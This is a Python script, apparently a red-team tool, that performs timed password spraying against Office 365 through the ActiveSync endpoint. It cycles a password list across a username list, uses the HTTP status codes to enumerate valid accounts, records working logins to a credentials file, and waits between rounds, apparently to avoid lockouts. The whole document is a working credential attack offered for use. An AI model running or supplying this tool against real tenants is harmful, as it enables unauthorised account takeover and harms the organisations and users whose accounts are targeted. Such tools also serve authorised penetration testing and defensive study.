#! /usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import argparse
import os
import requests
import time
from datetime import datetime

print ('''
'       //////\\\\\\\\\\
'       彡▄▄  ▄▄ ミ
'       ι|  լյ   |l
'         \( ━ )/
'     ▄▄▄▄█ "'" █▄▄▄▄
'     ██▒▒▒█    █▒▒▒██
'     ██ ▒▒▒▒  ▒▒▒▒ ██
'    ██   ▒▒▒▒▒▒▒   ██
'   ██     ▒▒▒▒▒    ██
    ▄👊▄███████████▄👊▄
     ¤=██ [<•√•>]██=¤
      ▓▓▓██████████▓▓▓
    ▓▓▓ ██  ███ ██ ▓▓▓
    ▓▓▓ ┃┃  ███ ┃┃ ▓▓▓
    ▓▓▓ ┃┃  ███ ┃┃ ▓▓▓ 
     ▓▓▓ █▒ ███▒█ ▓▓▓
        ▓▓ιι███ιι▓▓'
'          ███
''')

# 1200 seconds = 20 minutes (using time module)
now = datetime.now()

# Create the argument parser
parser = argparse.ArgumentParser(description="Automatically password spray against Office 365 on timed interval")

# Argument parser arguments
parser.add_argument("-p", "--passwordList", help="Passwords file, one password per line", required=True)
parser.add_argument("-u", "--users", help="Potential usernames file, one username per line", required=True)
parser.add_argument("-o", "--output", help="Output folder where output will be stored (valid credentials, all attempts and valid users)", required=True)
parser.add_argument("-i", "--interval", metavar='N', type=int, help="Interval between sprays, in seconds",default=1200, required=False)

# Execue the parser
args = parser.parse_args()

# Define input and output files
password_file = args.passwordList
user_file = args.users
output_folder = args.output
output_file = os.path.join(output_folder,"outputfile.txt")
creds_file = os.path.join(output_folder,"creds.txt")
valid_users_file = os.path.join(output_folder,"validusers.txt")
interval = args.interval

url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"


# Run a password against all users 

def userPassCheck(password):
    output = open(output_file,"w+")
    creds = open(creds_file,"w+")
    validUsers = open(valid_users_file,"w+")

    with open(user_file, 'r') as open_userfile:
        users = open_userfile.readlines()
        for line in users:
            user = line.strip()
            headers = {"MS-ASProtocolVersion": "16.1"}
            auth = (user, password)

            r = requests.options(url, headers=headers, auth=auth)
            status = r.status_code
            if status == 401:
                output.write('[+]' + " " + str(status) + " " + str(user) + " "+ str(password) + " " + 'VALID USER\n')
                validUsers.write('[+]' + " " + str(status) + " " + str(user) + " " + str(password) + " " + 'VALID USER\n')
            elif status == 404:
                if r.headers.get("X-CasErrorCode") == "UserNotFound":
                    pass
                    output.write('[-]' + " " + str(status) + " " + str(user) + " " + str(password) + " " + 'INVALID USER\n')
            elif status == 403:
                pass
                output.write('[#]' + " " + str(status) + " " + str(user) + " " + str(password) + " " + 'VALID PASSWD 2FA - Possible False Positive\n')
            elif status == 200:
                print('[!]' + " " + str(status) + " " + str(user) + " " + str(password) + " " + 'VALID LOGIN\n' )
                output.write('[!]' + " " + str(status) + " " + str(user) + " " + str(password) + " " + 'VALID LOGIN\n')
                creds.write('[!]' + " " + str(status) + " " + str(user) + " " + str(password) + " " + 'VALID LOGIN\n')
                print('[!]', status, user, password, 'VALID LOGIN')
                output.write('[!]' + " " + str(status) + " " + str(user) + " " + str(password) + " " + 'VALID LOGIN\n')
                creds.write('[!]' + " " + str(status) + " " + str(user) + " " + str(password) + " " + 'VALID LOGIN\n')
            else:
                output.write('[?]' + " " + str(user) + " " + str(password) + " " + 'UNKNOWN\n')
    open_userfile.close
    output.close()
    creds.close()
    validUsers.close()
    
# Run through users
with open(password_file, 'r',encoding='latin-1') as open_passwordfile:
        passwords = open_passwordfile.readlines()
        for line in passwords:
                password = line.strip()
                print('Attempting: ', password)
                print('Current date & time: ', now.strftime('%Y-%m-%d %H:%M'))
                userPassCheck(password)
                # wait
                time.sleep(interval)	
                print('--- Waiting ', interval, ' seconds or', interval/60, ' minutes ----')
        open_passwordfile.close





